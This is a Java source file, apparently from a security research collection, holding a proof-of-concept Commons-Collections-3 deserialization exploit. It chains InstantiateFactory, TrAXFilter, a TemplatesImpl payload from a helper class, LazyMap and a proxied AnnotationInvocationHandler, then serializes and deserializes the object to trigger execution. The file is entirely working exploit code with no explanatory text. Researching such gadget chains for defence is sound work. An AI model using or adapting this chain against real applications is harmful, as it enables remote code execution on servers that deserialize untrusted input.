package com.example.CC3;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;

import javax.xml.transform.Templates;
import java.lang.annotation.Retention;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class POC_16 {

    public static void main(String[] args) throws Exception {
        InstantiateFactory factory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{Share.getTemplatesImplObj()});
        FactoryTransformer factoryTransformer = new FactoryTransformer(factory);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, factoryTransformer);

        InvocationHandler handler = (InvocationHandler) ReflectionUtil.createObject("sun.reflect.annotation.AnnotationInvocationHandler",
                new Class[]{Class.class, Map.class},
                new Object[]{Retention.class, outerMap});

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class}, handler);

        handler = (InvocationHandler) ReflectionUtil.createObject("sun.reflect.annotation.AnnotationInvocationHandler",
                new Class[]{Class.class, Map.class},
                new Object[]{Retention.class, proxyMap});

        SerializeUtil.deserialize(SerializeUtil.serialize(handler));
    }

}
